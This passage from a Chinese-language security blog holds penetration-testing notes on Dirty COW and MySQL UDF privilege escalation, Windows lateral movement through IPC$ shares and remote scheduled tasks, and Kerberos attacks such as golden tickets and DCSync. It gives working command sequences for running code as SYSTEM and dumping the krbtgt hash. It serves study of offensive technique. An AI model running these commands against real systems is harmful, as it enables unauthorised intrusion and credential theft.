<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>gcc -pthread dirty.c -o exp -lcrypt<br> ./exp<br>su firefart </p>
<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h4><ol>
<li>查找插件库的路径<br><code>show variables like &#39;%plugin%&#39;</code></li>
<li>将so文件的内容解码，写入到mysql插件库目录中<br><code>select unhex(&#39;so文件的16进制编码&#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;</code></li>
<li>创建函数<br><code>create function sys_eval returns string soname &#39;xxx.so&#39;;</code></li>
<li>执行系统命令<br><code>select sys_eval(&quot;whoami&quot;);</code></li>
</ol>
<h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><h3 id="IPC-amp-at-amp-schticks"><a href="#IPC-amp-at-amp-schticks" class="headerlink" title="IPC$ &amp; at &amp; schticks"></a>IPC$ &amp; at &amp; schticks</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接</span></span><br><span class="line">net use \\192.168.52.138\ipc$                   # 建立空连接</span><br><span class="line">net use \\192.168.52.138\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;  # 建立非空连接</span><br><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接建立之后的操作</span></span><br><span class="line">dir \\192.168.52.138\c$                             # 列出目标文件目录</span><br><span class="line">type \\192.168.52.138\c$\1.txt  #远程读取文件                                       </span><br></pre></td></tr></table></figure>
<h4 id="at-amp-schtasks-使用"><a href="#at-amp-schtasks-使用" class="headerlink" title="at &amp; schtasks 使用"></a>at &amp; schtasks 使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.52.138 #查看目标系统的时间</span><br><span class="line">copy calc.bat \\192.168.52.138\c$ #将文件复制到远程主机的c盘</span><br><span class="line">at \\192.168.52.138 4:11pm c:\calc.bat #设置定时任务</span><br></pre></td></tr></table></figure>
<p>windows server2008以后的版本at命令已经被弃用了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy hack.bat \\192.168.52.138\c$</span><br><span class="line">schtasks /create /tn hack /tr C:\hack.bat /sc ONSTART /s 192.168.52.138 /ru &quot;system&quot; /u administrator /p Abc123456！ #创建了名为hack的计划任务，设置计划任务在系统启动时触发，指定以系统权限（Local System）运行该计划任务。如果没有建立ipc$需要/u/p</span><br><span class="line">schtasks /run /tn hack /s 192.168.52.138</span><br><span class="line">schtasks /delete /s 192.168.52.138 /u administrator /p Abc123456! /tn hack /f</span><br></pre></td></tr></table></figure>

<h3 id="windows-Kerberos身份认证协议"><a href="#windows-Kerberos身份认证协议" class="headerlink" title="windows Kerberos身份认证协议"></a>windows Kerberos身份认证协议</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png" alt="1-1024x700"><br>可以把kerberos认证流程简要的分为三个部分：</p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>client向<strong>AS(Authentication Service)<strong>证明自己的身份的过程，目标是获取</strong>TGT(Ticket Granting Ticket)<strong>票据<br>请求包中包含：请求的用户名、客户端主机名、加密类型和</strong>Authenticator</strong>(用户NTLM hash加密的时间戳)以及一些其他信息。<br>AS会返回给Client一个<strong>Logon Session Key</strong>（请求用户client的NTLM hash对Session-key as进行加密）和<strong>krbtgt用户 hash加密的TGT票据</strong>(TGT里面包含PAC，PAC包含Client的域sid、Client所在的组)</p>
<h5 id="HASH传递（PTH）"><a href="#HASH传递（PTH）" class="headerlink" title="HASH传递（PTH）"></a>HASH传递（PTH）</h5><ol>
<li>DCsync攻击获取域内用户hash<h5 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h5><h5 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h5><h5 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h5><h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5>获取krbtgt的hash值，该值的方式有两种：</li>
</ol>
<p>（1）控制了域控然后查询 secretsdump.exe 域名/administrator:密码@IP</p>
<p>（2）通过dsync查询 milikatz-&gt;lsadump::dcsync /domian:域名 /user:krbtgt</p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p><strong>TGS(Ticket Granting Service)<strong>通过client的TGT判断其是否有服务的访问权限，目标是获取</strong>ST(SEerver Ticket)</strong><br>返回一个用<strong>Login session key</strong>加密后的用于确保客户端服务器之间通讯安全的<strong>server-session -key</strong>，并且生成用<strong>Server_Hash</strong>加密的TGS票据</p>
<h5 id="委托攻击"><a href="#委托攻击" class="headerlink" title="委托攻击"></a>委托攻击</h5><p>Rubeus</p>
<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>client拿着ST票据与服务端进行通信</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/server/" rel="tag"># server</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/02/29/front/csrf/" rel="prev" title="csrf">
                  <i class="fa fa-chevron-left"></i> csrf
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/03/23/cloude/k8s%E5%85%A5%E9%97%A8/" rel="next" title="k8s入门">
                  k8s入门 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">mayylu</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
